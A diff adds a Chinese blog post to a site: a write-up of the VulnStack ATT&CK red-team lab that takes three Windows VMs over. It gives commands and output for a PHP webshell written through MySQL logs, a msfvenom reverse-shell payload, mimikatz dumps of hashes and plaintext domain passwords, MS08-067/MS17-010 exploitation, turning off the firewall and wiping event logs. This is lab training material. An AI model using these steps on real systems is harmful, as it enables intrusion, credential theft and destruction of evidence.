@@ -229,6 +229,306 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/09/VulnStack-ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98-%E4%B8%80-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zrools">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zrools">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/09/VulnStack-ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98-%E4%B8%80-Writeup/" itemprop="url">VulnStack - ATT&CK红队评估实战(一) Writeup</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-09T13:48:56+08:00">
+                2020-03-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
+<li><strong>项目地址</strong></li>
+</ul>
+<p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
+<ul>
+<li><strong>网络拓扑</strong></li>
+</ul>
+<p><img src="/images/2020/03/09/00.png" alt=""></p>
+<h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><p>下载回来有三个虚拟机：</p>
+<ul>
+<li><strong>VM1:</strong> vulnstack-win7</li>
+<li><strong>VM2:</strong> vulnstack-Win2K3 Metasploitable</li>
+<li><strong>VM3:</strong> vulnstack-winserver08</li>
+</ul>
+<p>提供的是VMware直接打包的虚拟机文件(<code>.vmdk</code>)，使用VMWare的根据官方提供的截图配置就可以了，由于我是Linux环境，装的是VirtualBox，需要稍作调整，根据项目截图的网络配置：</p>
+<ul>
+<li><strong>192.168.54.0/24：</strong> Web服务环境，在VBox中用Host-only Adapter(主机模式)</li>
+<li><strong>192.168.72.0/24：</strong> 域内网环境，在VBox中用Internal(内网模式) </li>
+</ul>
+<p>宿主机充当测试机，这里只配置三台虚拟机网络就可以了，<code>Host-only Adapter</code>直接在菜单栏里添加，<code>Internal</code>在网卡适配器填入相同的名称，比如<code>intnet0</code>，网卡配置：</p>
+<ul>
+<li><strong>vulnstack-win7：</strong> intnet0、vboxnet0</li>
+<li><strong>vulnstack-Win2K3 Metasploitable：</strong> intnet0</li>
+<li><strong>vulnstack-winserver08：</strong> intnet0</li>
+</ul>
+<p>由于没有快照文件，使用VirtualBox各建一个虚拟机附加相应的<code>.vmdk</code>文件，然后在网卡配置选择对应的模式和网络。</p>
+<p><img src="/images/2020/03/09/01.png" alt=""></p>
+<p>接着登录各个VM设置固定IP，内网域成员主机网卡DNS地址指向域控IP地址，三个VM的IP分别为：</p>
+<ul>
+<li><strong>VM1(Win7)：</strong> 192.168.54.3(vboxnet0)、192.168.72.104(intnet0)</li>
+<li><strong>VM2(W2003)：</strong> 192.168.72.103(intnet0)</li>
+<li><strong>VM3(W2008):</strong> 192.168.72.102(intnet0)</li>
+</ul>
+<p>由于VM2和VM3都在内网，要对其进行渗透首先得拿下VM1 Web服务器的权限，再作为跳板进入内网横向移动。各个VM都有着比较多的服务，这里只挑比较容易的来练习，主要是获取服务器SYSTEM权限。</p>
+<p>本文使用到的工具：</p>
+<ul>
+<li>Metasploit Framework： Kali Linux</li>
+<li>Ladon： <a href="https://github.com/k8gege/Ladon.git" target="_blank" rel="noopener">https://github.com/k8gege/Ladon.git</a></li>
+<li>dirmap： <a href="https://github.com/H4ckForJob/dirmap.git" target="_blank" rel="noopener">https://github.com/H4ckForJob/dirmap.git</a></li>
+</ul>
+<h3 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h3><ul>
+<li>VM1(Win7)的Web服务需要进去手动启动phpStudy(C:/phpStudy)；</li>
+<li>VM2(Win2003)的<code>.vmdk</code>拷过来附加到VirtualBox发生MBR引导错误出现：<code>error loading operating system</code>，用GHOST复制修复一下虚拟磁盘，如果启动蓝屏，试试勾选APIC (虚拟机配置System选项)和把接口改为<code>SCSI</code>：</li>
+</ul>
+<p><img src="/images/2020/03/09/03.png" alt=""></p>
+<p>如果Win2003如果开机发现没有域登录选项，需要重新手动加入域，登录界面才有域登录选项：</p>
+<p><img src="/images/2020/03/09/02.png" alt=""></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="端口扫描-amp-Web目录扫描"><a href="#端口扫描-amp-Web目录扫描" class="headerlink" title="端口扫描 &amp; Web目录扫描"></a>端口扫描 &amp; Web目录扫描</h3><p>使用nmap对VM1(192.168.54.3)进行端口扫描：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ nmap 192.168.54.3</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.54.3</span><br><span class="line">Host is up (0.00044s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80&#x2F;tcp   open  http</span><br><span class="line">3306&#x2F;tcp open  mysql</span><br></pre></td></tr></table></figure>
+
+<p>80端口打开就是一个探针页面：</p>
+<p><img src="/images/2020/03/09/04.png" alt=""></p>
+<p>再进一步收集Web目录和文件信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 dirmap.py -i http:&#x2F;&#x2F;192.168.54.3 -lcf</span><br></pre></td></tr></table></figure>
+<p><img src="/images/2020/03/09/05.png" alt=""></p>
+<p>发现<code>phpinfo.php</code>、<code>phpmyadmin</code>、<code>beifen.rar</code>等信息。</p>
+<h3 id="phpMyAdmin-GetShell"><a href="#phpMyAdmin-GetShell" class="headerlink" title="phpMyAdmin GetShell"></a>phpMyAdmin GetShell</h3><p>直接<code>root/root</code>弱口令登录成功。</p>
+<ol>
+<li>由于在探针知道绝对路径为：<code>C:/phpStudy/WWW</code>，查看<code>secure_file_priv</code>，看是否可以使用导出写WebShell：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[cmd]); ?&gt;&#39; into outfile &#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;z.php&#39;;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;%secure%&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>显示为<code>NULL</code>，表示限制，不允许导入导出。</p>
+<blockquote>
+<p>注意：这个配置需要在 my.ini 文件修改。</p>
+</blockquote>
+<ol start="2">
+<li>使用日志写Shell</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables  like  &#39;%general%&#39;;</span><br></pre></td></tr></table></figure>
+
+<p><code>general_log</code>显示为<code>OFF</code>，尝试开启并更改日志目录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log&#x3D;on;</span><br><span class="line"></span><br><span class="line">set global general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;z.php&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>写WebShell，顺便关闭日志：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;;</span><br><span class="line"></span><br><span class="line">SET GLOBAL general_log &#x3D; off;</span><br></pre></td></tr></table></figure>
+
+<p>antSword连上：</p>
+<p><img src="/images/2020/03/09/06.png" alt=""></p>
+<h3 id="CMS后台GetShell"><a href="#CMS后台GetShell" class="headerlink" title="CMS后台GetShell"></a>CMS后台GetShell</h3><p>接着再看一下<code>beifen.rar</code>这个文件，下载解压后是个<code>yxcms</code>文件夹，访问<code>yxcms</code>目录正是站点，直奔后台：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.54.3&#x2F;yxcms&#x2F;index.php?r&#x3D;admin&#x2F;index&#x2F;login</span><br></pre></td></tr></table></figure>
+
+<p>尝试<code>admin/123456</code>弱口令登录成功，然后在模板文件管理直接写Shell就可以了：</p>
+<p><img src="/images/2020/03/09/07.png" alt=""></p>
+<h2 id="内网搜集"><a href="#内网搜集" class="headerlink" title="内网搜集"></a>内网搜集</h2><p>结合WebShell反弹Shell到MSF进行内网渗透：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.54.1 lport&#x3D;5555 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>使用antSword上传<code>shell.exe</code>到Web服务器，然后在终端执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ msfconsole</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line"></span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.54.1</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 5555</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2020/03/09/08.png" alt=""></p>
+<p>Administrator权限，直接<code>getsystem</code>提权：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2020/03/09/09.png" alt=""></p>
+<p>使用<code>mimikatz</code>抓hash：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : stu1.god.org</span><br><span class="line">BootKey    : fd4639f4e27c79683ae9fee56b44393f</span><br><span class="line"></span><br><span class="line">Rid  : 500</span><br><span class="line">User : Administrator</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">Rid  : 501</span><br><span class="line">User : Guest</span><br><span class="line">LM   : </span><br><span class="line">NTLM : </span><br><span class="line"></span><br><span class="line">Rid  : 1000</span><br><span class="line">User : liukaifeng01</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0</span><br></pre></td></tr></table></figure>
+
+<p>用<code>wdigest</code>明文密码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;25306   NTLM                                    </span><br><span class="line">0;248138  Kerberos   GOD           Administrator  Hongrisec@2019</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意： 使用<code>mimikatz</code>抓明文之前先将<code>PID</code>迁移得到64位进程上，不然可能导致抓不到明文。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; migrate 400   #  400 是 winlogon.exe 的 PID</span><br></pre></td></tr></table></figure>
+
+<h3 id="端口信息收集"><a href="#端口信息收集" class="headerlink" title="端口信息收集"></a>端口信息收集</h3><p>从<code>ifconfig /all</code>得知Web服务器有两个网卡，为了方便，直接上传<code>Ladon</code>进行内网主机端口信息收集：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload &#x2F;root&#x2F;Tools&#x2F;Ladon&#x2F;Ladon.exe C:&#x2F;phpStudy&#x2F;backup</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;cd C:&#x2F;phpStudy&#x2F;backup</span><br><span class="line"></span><br><span class="line">C:\phpStudy\backup&gt;Ladon.exe 192.168.72.1&#x2F;24 PortScan</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2020/03/09/10.png" alt=""></p>
+<p>得到2个存活主机，主要开放端口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.72.102 80       Default is Web</span><br><span class="line">192.168.72.102 389      Default is LDAP</span><br><span class="line">192.168.72.102 445      Default is SMB</span><br><span class="line"></span><br><span class="line">192.168.72.103 21       Default is FTP -&gt; 220 Microsoft FTP Service</span><br><span class="line">192.168.72.103 7001     Default is Weblogic</span><br><span class="line">192.168.72.103 7002     Maybe is Weblogic</span><br><span class="line">192.168.72.103 445      Default is SMB</span><br></pre></td></tr></table></figure>
+
+<h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><h3 id="系统指纹识别"><a href="#系统指纹识别" class="headerlink" title="系统指纹识别"></a>系统指纹识别</h3><p>从端口判断102可能是主域机器，103是域成员，使用<code>Ladon</code>对<code>192.168.72.103</code>系统指纹识别：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\phpStudy\backup&gt;Ladon.exe 192.168.72.103 OsScan</span><br><span class="line">Ladon.exe 192.168.72.103 OsScan</span><br><span class="line">Ladon 6.0</span><br><span class="line">By K8gege</span><br><span class="line">Start: 2020&#x2F;2&#x2F;20 14:16:10</span><br><span class="line">192.168.72.103</span><br><span class="line">load OsScan</span><br><span class="line">IP      Mac     Domain&#x2F;HostName OSversion&#x2F;Service       Vendor</span><br><span class="line">192.168.72.103  08-00-27-D4-EE-57       god.org\ROOT-WIN2003    [Win 2003 3790]</span><br><span class="line">IP Finished!</span><br></pre></td></tr></table></figure>
+
+<p>是台<code>Win2003</code>，开了<code>445</code>端口，尝试拿<code>MS08-067</code>打。</p>
+<h3 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h3><p>首先添加路由，使用Web服务器作为跳板访问<code>Win2003</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 192.168.72.0&#x2F;24</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run autoroute -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2020/03/09/11.png" alt=""></p>
+<h3 id="Bind-TCP"><a href="#Bind-TCP" class="headerlink" title="Bind TCP"></a>Bind TCP</h3><p>接着<code>MS08-067</code>搭配<code>Bind TCP</code>使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line"></span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;ms08_067_netapi</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;ms08_067_netapi) &gt; set rhost 192.168.72.103</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;ms08_067_netapi) &gt; set payload windows&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;ms08_067_netapi) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2020/03/09/12.png" alt=""></p>
+<p>成功反弹Shell回来，抓下hash：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : root-win2003.god.org</span><br><span class="line">BootKey    : 5d587d9451170f6b9b246da09ad82ab9</span><br><span class="line"></span><br><span class="line">Rid  : 500</span><br><span class="line">User : Administrator</span><br><span class="line">LM   : a9a1d510b01177d1aad3b435b51404ee</span><br><span class="line">NTLM : afc44ee7351d61d00698796da06b1ebf</span><br><span class="line"></span><br><span class="line">Rid  : 501</span><br><span class="line">User : Guest</span><br><span class="line">LM   : </span><br><span class="line">NTLM :</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>mimikatz</code>明文没抓成功，开始缺少<code>fltlib.dll</code>，打上能运行，抓明文报错，换<code>wce.exe</code>也运行报错，可能是我这里环境问题。</p>
+</blockquote>
+<h2 id="构建通道"><a href="#构建通道" class="headerlink" title="构建通道"></a>构建通道</h2><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>扫描端口的时候103开放了21端口，使用MSF进行端口转发到本地，回到MSF session 1 (Win7)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 2...</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;ms08_067_netapi) &gt; sessions 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line">meterpreter &gt; portfwd add -L 192.168.54.1 -l 2121 -p 21 -r 192.168.72.103</span><br><span class="line">[*] Local TCP relay created: 192.168.54.1:2121 &lt;-&gt; 192.168.72.103:21</span><br><span class="line">meterpreter &gt; portfwd list</span><br><span class="line"></span><br><span class="line">Active Port Forwards</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   Index  Local              Remote             Direction</span><br><span class="line">   -----  -----              ------             ---------</span><br><span class="line">   1      192.168.54.1:2121  192.168.72.103:21  Forward</span><br><span class="line"></span><br><span class="line">1 total active port forwards.</span><br></pre></td></tr></table></figure>
+
+<h3 id="本地访问"><a href="#本地访问" class="headerlink" title="本地访问"></a>本地访问</h3><p><code>192.168.72.103</code>的<code>21</code>端口转发到<code>192.168.54.1</code>的<code>2121</code>端口，在攻击机上直接访问：</p>
+<p><code>ftp://192.168.54.1:2121</code></p>
+<p><img src="/images/2020/03/09/13.png" alt=""></p>
+<h2 id="渗透域控"><a href="#渗透域控" class="headerlink" title="渗透域控"></a>渗透域控</h2><h3 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h3><p>前面扫描端口开着<code>445</code>，验证有<code>MS17-010</code>漏洞，尝试拿<code>exploit/windows/smb/ms17_010_eternalblue</code>和<code>windows/x64/meterpreter/bind_tcp</code>直接打<code>192.168.72.102</code>，很耗时，而且session很大概率直接就<code>died</code>了。</p>
+<p>拿<code>exploit/windows/smb/ms17_010_psexec</code>出现了<code>Exploit completed, but no session was created.</code>，没有session。</p>
+<ul>
+<li><strong>系统防火墙</strong></li>
+</ul>
+<p>估计是被防火墙干掉了，尝试用<code>ms17_010_command</code>先关掉它：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;ms17_010_psexec) &gt; use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(admin&#x2F;smb&#x2F;ms17_010_command) &gt; set rhosts 192.168.72.102</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(admin&#x2F;smb&#x2F;ms17_010_command) &gt; set command &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(admin&#x2F;smb&#x2F;ms17_010_command) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2020/03/09/14.png" alt=""></p>
+<ul>
+<li><strong>MS17-010 和 Bind TCP</strong></li>
+</ul>
+<p>接着再拿<code>ms17_010_psexec</code>和<code>bind_tcp</code>打一次：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;ms17_010_psexec) &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;ms17_010_psexec) &gt; set rhosts 192.168.72.102</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;ms17_010_psexec) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;ms17_010_psexec) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2020/03/09/15.png" alt=""></p>
+<p>成功反弹获取session。</p>
+<ul>
+<li><strong>抓取明文信息</strong></li>
+</ul>
+<p>使用<code>mimikatz</code>抓取明文密码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line"></span><br><span class="line">meterpreter &gt; wdigest</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2020/03/09/16.png" alt=""></p>
+<h2 id="清理痕迹"><a href="#清理痕迹" class="headerlink" title="清理痕迹"></a>清理痕迹</h2><ul>
+<li>删除添加的域管理账号(这里没有添加)；</li>
+<li>删除服务器上渗透上传的工具；</li>
+<li>删除应用程序、系统和安全日志；</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev</span><br><span class="line">[*] Wiping 1474 records from Application...</span><br><span class="line">[*] Wiping 4836 records from System...</span><br><span class="line">[*] Wiping 41363 records from Security...</span><br></pre></td></tr></table></figure>
+<ul>
+<li>断开MSF等连接；</li>
+<li>其他。</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次的靶机环境比较简单，只是用MSF配合一些小工具使用，归纳下前面的漏洞利用：</p>
+<ul>
+<li>phpMyAdmin弱口令配合探针信息(WWW绝对路径)日志写Shell；</li>
+<li>CMS后台弱口令配合后台模板管理写Shell；</li>
+<li>备份文件文件泄漏数据库配置和CMS源码等信息；</li>
+<li>内网主机未打补丁，可以直接远程获取系统权限(MS08-067、MS17-010)。</li>
+</ul>
+<p>主机上还有些其他的服务，比如<code>FTP</code>、<code>Weblogic</code>和<code>LDAP</code>等可能存在漏洞，信息收集可以看看浏览器有没有保存密码什么的，<code>mimikatz</code>抓不到明文看看是不是64位机子加载到32位版本了，<code>payload</code>打过去异常可以换一个试试或者看看是不是防火墙的影响什么的，总之，没有一成不变的办法，遇到问题还要多分析。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/07/XSS%E3%80%81%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E3%80%81JSONP%E3%80%81CORS%E5%92%8CWebSocket/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1519,7 +1819,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1532,7 +1832,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
